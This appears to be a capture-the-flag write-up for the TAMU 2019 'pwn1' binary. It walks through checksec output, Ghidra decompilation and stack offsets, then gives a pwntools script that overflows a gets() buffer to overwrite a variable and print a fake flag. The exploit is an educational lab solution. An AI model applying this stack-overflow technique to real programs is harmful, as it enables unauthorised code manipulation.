### Binary Exploitation

### Source: Tamu19

### Basic File Check

```
┌──(venv)─(mark__haxor)-[~/Documents/Pentest/BOF/03-begineer_bof]
└─$ file tamu19_pwn1 
tamu19_pwn1: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d126d8e3812dd7aa1accb16feac888c99841f504, not stripped
                                                                                                                                                                                                                  
┌──(venv)─(mark__haxor)-[~/Documents/Pentest/BOF/03-begineer_bof]
└─$ checksec tamu19_pwn1 
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Documents/Pentest/BOF/03-begineer_bof/tamu19_pwn1'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

We see its a `x86` binary which is `dynamically linked`, `non-stripped` and its protection are `NX,PIE`

Now i'll run it to have an idea of what it does

```
┌──(venv)─(mark__haxor)-[~/Documents/Pentest/BOF/03-begineer_bof]
└─$ ./tamu19_pwn1                           
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
pwner
I don't know that! Auuuuuuuugh!
```

Lets decompile the binary using ghidra

```
{
  int input_length;
  char input [43];
  int secret;
  undefined4 local_14;
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  setvbuf(stdout,(char *)0x2,0,0);
  local_14 = 2;
  secret = 0;
  puts(
      "Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other  side he see."
      );
  puts("What... is your name?");
  fgets(input,0x2b,stdin);
  input_length = strcmp(input,"Sir Lancelot of Camelot\n");
  if (input_length != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is your quest?");
  fgets(input,0x2b,stdin);
  input_length = strcmp(input,"To seek the Holy Grail.\n");
  if (input_length != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is my secret?");
  gets(input);
  if (secret == L'\xdea110c8') {
    print_flag();
  }
  else {
    puts("I don\'t know that! Auuuuuuuugh!");
  }
  return 0;
}
```

We can see what it does

```
1. It asks for the username which is (Sir Lancelot of Camelot) and uses fget to receieve the input which is then stored in a 43bytes buffer 
2. If that first codition isn't meet it exits but if it if we get another question
3. What's the quest which is (To seek the Holy Grail.) and the answer is recieved using fget which is also still stored in the 43bytes buffer 
4. If the condition isn't meet it exits but if it is we get another question
5. What is my secret 
6. It does an if check to compare the value stored in the secret variable with 0xdea110c8
7. if its correct it prints out the flag else it exits
```

Now from this we know that get can perform a buffer overflow cause the third question uses an insecure input receive method which is `get`

Also the problem is, in the code the secret variable currently has a value of `0`

So when the if check reaches we won't get the flag cause the comparism isn't meet

So lets try it now 

```
┌──(venv)─(mark__haxor)-[~/Documents/Pentest/BOF/03-begineer_bof]
└─$ ./tamu19_pwn1
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
Sir Lancelot of Camelot
What... is your quest?
To seek the Holy Grail.
What... is my secret?
lol 
I don't know that! Auuuuuuuugh!
```

Now lets start it again and this time around send 100 A's when we get to the third question

```
┌──(venv)─(mark__haxor)-[~/Documents/Pentest/BOF/03-begineer_bof]
└─$ python2 -c "print 'A'*100"                               
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
                                                                                                                                                                                                                  
┌──(venv)─(mark__haxor)-[~/Documents/Pentest/BOF/03-begineer_bof]
└─$ ./tamu19_pwn1             
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
Sir Lancelot of Camelot
What... is your quest?
To seek the Holy Grail.
What... is my secret?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
I don't know that! Auuuuuuuugh!
zsh: segmentation fault  ./tamu19_pwn1
```

Sweet we get a segfault

Now lets get the offset. Which we will get from looking at the stack frame in ghidra


```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             int __cdecl main(void)
             int               EAX:4          <RETURN>                                XREF[1]:     00010807(W)  
             undefined4        EAX:4          input_length                            XREF[1]:     00010807(W)  
             undefined4        Stack[0x0]:4   local_res0                              XREF[1]:     00010780(R)  
             undefined1        Stack[-0x10]:1 local_10                                XREF[1]:     000108d9(*)  
             undefined4        Stack[-0x14]:4 local_14                                XREF[1]:     000107ad(W)  
             undefined4        Stack[-0x18]:4 secret                                  XREF[2]:     000107b4(W), 
                                                                                                   000108b2(R)  
             undefined1[43]    Stack[-0x43]   input                                   XREF[5]:     000107ed(*), 
                                                                                                   00010803(*), 
                                                                                                   0001084f(*), 
                                                                                                   00010865(*), 
                                                                                                   000108a6(*)  
                             main                                            XREF[5]:     Entry Point(*), 
                                                                                          _start:000105e6(*), 00010ab8, 
                                                                                          00010b4c(*), 00011ff8(*)  
```

Nice we see our input starts with an offset of `-0x43` and the offset to secret is `-0x18`

Therefore this gives an offset of `0x43 - 0x18 = 0x2b` between the start of our input and the secret variable

So bascially what we'll do is to overwrite the variable secret with the content of `0xdea110c8`

Here's my script below

```
from pwn import *

io = process('./tamu19_pwn1')

answer_1 = "Sir Lancelot of Camelot"
answer_2 = "To seek the Holy Grail."

io.sendlineafter(b'?', answer_1)
io.sendline(answer_2)

offset = "0"*0x2b
overwrite = p32(0xdea110c8)

secret = offset + overwrite 

io.send(secret)
io.send('\n')
io.interactive()
```

Lets run it 

```
┌──(venv)─(mark__haxor)-[~/Documents/Pentest/BOF/03-begineer_bof]
└─$ python2 pwnexploit.py
[+] Starting local process './tamu19_pwn1': pid 103999
[*] Switching to interactive mode

[*] Process './tamu19_pwn1' stopped with exit code 0 (pid 103999)
What... is your quest?
What... is my secret?
Right. Off you go.
FLAG(this_is_a_fake_flag}

[*] Got EOF while reading in interactive
$ 
[*] Got EOF while sending in interactive

```

And we're done 


<br> <br>
[Back To Home](../../index.md)
<br>







